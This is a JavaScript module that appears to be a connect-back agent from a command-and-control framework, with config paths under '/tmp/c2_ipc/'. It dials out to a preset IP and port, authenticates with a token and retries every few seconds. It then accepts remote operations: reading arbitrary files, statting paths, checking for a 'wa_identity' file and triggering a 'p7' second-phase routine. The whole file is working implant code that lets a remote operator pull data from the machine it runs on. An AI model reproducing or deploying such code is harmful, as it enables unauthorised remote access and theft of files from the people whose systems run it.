// pe_dbg_tcp — lab connect-back TCP dbg (hot-pulled). No TLS/certs.
// Needs pe_main: globalThis.__peNet + __peFsRead. Config: dbg.tcp.json / task.json.
(function () {
  var NET = globalThis.__peNet;
  function pelog(msg) {
    try {
      if (typeof LOG === 'function') LOG('[DBG-TCP] ' + msg);
    } catch (e) {}
  }

  var DEFAULT_HOST = '192.168.31.32';
  var DEFAULT_PORT = 19527;
  var MAX_READ = 65536;
  var MAX_FRAME = 256 * 1024;

  function fsRead(path, maxn) {
    maxn = maxn || MAX_READ;
    if (maxn > MAX_READ) maxn = MAX_READ;
    try {
      if (typeof globalThis.__peFsRead === 'function') return globalThis.__peFsRead(path, maxn);
    } catch (e) {}
    return null;
  }
  function fsStat(path) {
    try {
      if (typeof globalThis.__peFsStat === 'function') return globalThis.__peFsStat(path);
    } catch (e) {}
    var body = fsRead(path, 4);
    if (body === null) return { exists: false, size: -1 };
    var full = fsRead(path, MAX_READ);
    return { exists: true, size: full != null ? full.length : 0 };
  }

  function loadCfg() {
    var cfg = { host: DEFAULT_HOST, port: DEFAULT_PORT, token: '' };
    function merge(o) {
      if (!o || typeof o !== 'object') return;
      if (o.host) cfg.host = String(o.host);
      if (o.port != null) cfg.port = Number(o.port) || DEFAULT_PORT;
      if (o.token != null && String(o.token)) cfg.token = String(o.token);
      if (o.dbg_host) cfg.host = String(o.dbg_host);
      if (o.dbg_port != null) cfg.port = Number(o.dbg_port) || cfg.port;
      if (o.dbg_token) cfg.token = String(o.dbg_token);
    }
    try {
      var t1 = fsRead('/tmp/c2_ipc/dbg.tcp.json', 4096);
      if (t1) merge(JSON.parse(t1));
    } catch (e) {}
    try {
      var t2 = fsRead('/tmp/c2_ipc/mod.pe_dbg_tcp.task.json', 4096);
      if (t2) merge(JSON.parse(t2));
    } catch (e) {}
    try {
      if (globalThis.__pe_dbg_tcp_cfg) merge(globalThis.__pe_dbg_tcp_cfg);
    } catch (e) {}
    return cfg;
  }

  function u32be(n) {
    n = n >>> 0;
    return String.fromCharCode((n >>> 24) & 0xff, (n >>> 16) & 0xff, (n >>> 8) & 0xff, n & 0xff);
  }
  function parseU32be(s, off) {
    off = off || 0;
    if (!s || s.length < off + 4) return -1;
    return ((s.charCodeAt(off) & 0xff) << 24) |
      ((s.charCodeAt(off + 1) & 0xff) << 16) |
      ((s.charCodeAt(off + 2) & 0xff) << 8) |
      (s.charCodeAt(off + 3) & 0xff);
  }
  function sendFrame(fd, obj) {
    var body = JSON.stringify(obj);
    return NET.writeBytes(fd, u32be(body.length) + body);
  }

  var st = {
    ver: '0.1.0',
    fd: 0n,
    authed: false,
    cfg: null,
    buf: '',
    lastErr: '',
    _nextTry: 0
  };

  function disconnect() {
    try {
      if (st.fd && st.fd > 0n) NET.close(st.fd);
    } catch (e) {}
    st.fd = 0n;
    st.authed = false;
    st.buf = '';
  }

  function connectOnce() {
    if (!NET || typeof NET.connectIpv4 !== 'function') {
      st.lastErr = 'no___peNet';
      pelog('no __peNet — need newer pe_main (cold)');
      return false;
    }
    st.cfg = loadCfg();
    if (!st.cfg.token) {
      st.lastErr = 'no_token';
      pelog('missing token');
      return false;
    }
    disconnect();
    var fd = NET.connectIpv4(st.cfg.host, st.cfg.port);
    if (!fd || fd <= 0n) {
      st.lastErr = 'connect_fail';
      pelog('connect fail ' + st.cfg.host + ':' + st.cfg.port);
      return false;
    }
    try { NET.setNonblock(fd); } catch (e) {}
    st.fd = fd;
    // Client owns token; mark ready after hello. REPL closes if token mismatch.
    sendFrame(fd, { id: 'hello', op: 'auth', token: st.cfg.token, ver: st.ver });
    st.authed = true;
    pelog('connected ' + st.cfg.host + ':' + st.cfg.port);
    return true;
  }

  function handleOp(msg) {
    var id = msg.id != null ? msg.id : '';
    var op = String(msg.op || '');
    var t0 = Date.now();
    function ok(result) {
      return { id: id, ok: true, result: result, ms: Date.now() - t0 };
    }
    function fail(err) {
      return { id: id, ok: false, error: String(err).slice(0, 200), ms: Date.now() - t0 };
    }
    if (!st.authed) return fail('need_auth');

    if (op === 'ping') {
      var meta = globalThis.__pe_listen_meta || {};
      return ok({
        pong: true,
        pid: meta.pid || 0,
        path: meta.path || '',
        ver: st.ver,
        tick: meta.tick || 0
      });
    }
    if (op === 'fs_stat') return ok(fsStat(String(msg.path || '')));
    if (op === 'fs_read') {
      var path = String(msg.path || '');
      var max = Number(msg.max) || MAX_READ;
      if (max > MAX_READ) max = MAX_READ;
      var body = fsRead(path, max);
      if (body === null) return fail('fopen_fail');
      return ok({ path: path, size: body.length, data: body });
    }
    if (op === 'p7_status') {
      var pst = globalThis.__pe_p7_state || {};
      var waFile = fsStat('/tmp/wa_identity.json');
      return ok({
        p7_ready: !!pst.ready,
        p7_running: !!pst.running,
        wa_identity: !!(pst.wa_identity || (waFile && waFile.exists)),
        source: pst.source || '',
        err: pst.err || '',
        rc_attempted: !!pst.rc_attempted,
        rc_ok: !!pst.rc_ok,
        dbg: !!(globalThis.__pe_dbg && globalThis.__pe_dbg.ready)
      });
    }
    if (op === 'peek_state') {
      var keys = msg.keys || ['__pe_p7_state', '__pe_dbg'];
      if (!Array.isArray(keys)) keys = [keys];
      var allow = { __pe_p7_state: 1, __pe_dbg: 1, __pe_dbg_tcp: 1 };
      var out = {};
      for (var i = 0; i < keys.length; i++) {
        var k = String(keys[i] || '');
        if (!allow[k]) continue;
        try { out[k] = globalThis[k] || null; } catch (e) { out[k] = { error: String(e).slice(0, 80) }; }
      }
      return ok(out);
    }
    if (op === 'p7_run') {
      if (typeof globalThis.__peP7Phase2 !== 'function') return fail('p7_not_registered');
      try {
        return ok(globalThis.__peP7Phase2(msg.force ? 'force' : 'dbg_tcp') || {});
      } catch (e) {
        return fail(e);
      }
    }
    return fail('unknown_op');
  }

  function poll() {
    if (!st.fd || st.fd <= 0n) {
      if (!st._nextTry || Date.now() >= st._nextTry) {
        st._nextTry = Date.now() + 5000;
        connectOnce();
      }
      return;
    }
    try {
      var chunk = NET.readSome(st.fd, 65536);
      if (chunk && chunk.length) st.buf += chunk;
      while (st.buf.length >= 4) {
        var flen = parseU32be(st.buf, 0);
        if (flen < 0 || flen > MAX_FRAME) {
          pelog('bad frame len');
          disconnect();
          st._nextTry = Date.now() + 3000;
          return;
        }
        if (st.buf.length < 4 + flen) break;
        var raw = st.buf.slice(4, 4 + flen);
        st.buf = st.buf.slice(4 + flen);
        var msg = null;
        try { msg = JSON.parse(raw); } catch (e) {
          sendFrame(st.fd, { id: '', ok: false, error: 'bad_json' });
          continue;
        }
        if (!msg || !msg.op) continue;
        if (msg.op === 'auth_ok') {
          st.authed = true;
          continue;
        }
        // ignore echo of our own auth hello if REPL reflects
        if (msg.op === 'auth') continue;
        var resp = handleOp(msg);
        sendFrame(st.fd, resp);
      }
    } catch (e) {
      st.lastErr = String(e).slice(0, 80);
      pelog('poll err ' + st.lastErr);
      disconnect();
      st._nextTry = Date.now() + 3000;
    }
  }

  globalThis.__pe_dbg_tcp = {
    ver: st.ver,
    ready: true,
    poll: poll,
    reconnect: connectOnce,
    disconnect: disconnect,
    state: function () {
      return {
        ver: st.ver,
        connected: !!(st.fd && st.fd > 0n),
        authed: st.authed,
        host: st.cfg && st.cfg.host,
        port: st.cfg && st.cfg.port,
        lastErr: st.lastErr
      };
    }
  };
  if (!globalThis.__pe_loaded) globalThis.__pe_loaded = {};
  globalThis.__pe_loaded.pe_dbg_tcp = { ver: st.ver, ts: Date.now() };
  if (!globalThis.__pe_dbg) {
    globalThis.__pe_dbg = { ver: '0.3.0+tcp', ready: true, want_p7: true, tcp: true };
  } else {
    globalThis.__pe_dbg.tcp = true;
  }

  try { connectOnce(); } catch (e) { pelog('start err ' + String(e).slice(0, 80)); }
  pelog('module loaded ver=' + st.ver);
})();
